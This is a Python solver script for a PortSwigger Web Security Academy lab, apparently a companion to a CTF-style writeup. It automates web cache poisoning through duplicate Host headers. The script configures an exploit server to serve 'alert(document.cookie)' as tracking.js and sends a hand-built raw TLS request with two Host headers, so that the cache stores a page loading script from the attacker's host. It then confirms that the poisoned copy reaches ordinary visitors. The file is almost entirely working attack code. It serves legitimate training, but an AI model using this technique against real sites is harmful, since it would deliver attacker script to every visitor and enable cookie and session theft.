#!/usr/bin/env python3
"""
Web cache poisoning via ambiguous requests
PortSwigger Web Security Academy -- HTTP Host Header Attacks

Companion script for the writeup: 03-web-cache-poisoning-via-ambiguous-requests.md

What this does -- and why it needs raw sockets:
    The homepage builds <script src="//HOST/resources/js/tracking.js"> from
    the Host header, and responses are cached (max-age=30). Sending TWO Host
    headers on one request exposes a parsing discrepancy: the cache keys on
    the FIRST Host header, but the backend renders tracking.js's src from the
    SECOND. httpx (and effectively every high-level HTTP client) refuses to
    construct a request with a duplicate header, so this script builds the
    raw HTTP/1.1 request bytes by hand over a TLS socket for the one request
    that actually needs the duplicate Host lines. Everything else (finding
    the exploit server, configuring its payload, the verification request)
    goes through a normal httpx client.

Usage:
    python 03-web-cache-poisoning-via-ambiguous-requests.py <lab-url>
    e.g. python 03-web-cache-poisoning-via-ambiguous-requests.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import socket
import ssl
import sys
import time
from urllib.parse import urlparse

import httpx


def solve(lab_url: str) -> None:
    target_host = urlparse(lab_url).hostname
    client = httpx.Client(verify=False, follow_redirects=True, timeout=15)

    home = client.get(lab_url)
    exploit_m = re.search(r'(https://exploit-[^/]+\.exploit-server\.net)', home.text)
    if not exploit_m:
        print("[-] Could not find exploit server link on the homepage.")
        return
    exploit_server = exploit_m.group(1)
    exploit_domain = exploit_server.replace("https://", "")
    print(f"[*] Exploit server: {exploit_domain}")

    cookies = dict(client.cookies)
    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())

    print("[*] Configuring exploit server to serve alert(document.cookie) at /resources/js/tracking.js...")
    client.post(
        f"{exploit_server}/",
        data={
            "urlIs498": "on",
            "responseFile": "/resources/js/tracking.js",
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: application/javascript; charset=utf-8",
            "responseBody": "alert(document.cookie)",
            "formAction": "STORE",
        },
    )

    print("[*] Waiting 35s for the existing cache entry (max-age=30) to expire...")
    time.sleep(35)

    print("[*] Sending poisoned request with duplicate Host headers over a raw TLS socket...")
    poison_req = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {target_host}\r\n"
        f"Host: {exploit_domain}\r\n"
        f"Cookie: {cookie_str}\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    )

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = socket.create_connection((target_host, 443), timeout=15)
    ssock = ctx.wrap_socket(sock, server_hostname=target_host)
    ssock.sendall(poison_req.encode())
    resp = b""
    while True:
        try:
            data = ssock.recv(4096)
            if not data:
                break
            resp += data
        except socket.timeout:
            break
    ssock.close()

    resp_text = resp.decode("utf-8", errors="replace")
    print(f"[*] Poison response: {resp_text.split(chr(13)+chr(10))[0]}")

    tracking_m = re.search(r'src="//([^"]+)/resources/js/tracking\.js"', resp_text)
    tracking_host = tracking_m.group(1) if tracking_m else "NOT FOUND"
    print(f"[*] tracking.js host in poisoned response: {tracking_host}")

    if exploit_domain not in tracking_host:
        print("[-] Exploit domain wasn't reflected -- the duplicate-Host discrepancy didn't trigger.")
        return

    print("[*] Verifying the cache now serves the poisoned response to a normal request...")
    time.sleep(1)
    verify = client.get(lab_url)
    xcache = verify.headers.get("X-Cache", "N/A")
    verify_m = re.search(r'src="//([^"]+)/resources/js/tracking\.js"', verify.text)
    verify_host = verify_m.group(1) if verify_m else "NOT FOUND"
    print(f"[*] Normal GET / -- X-Cache: {xcache}, tracking.js host: {verify_host}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- cache now serves the poisoned tracking.js to every visitor.")
    else:
        print("[-] Not solved yet -- if X-Cache wasn't 'hit', wait and retry the verification GET.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
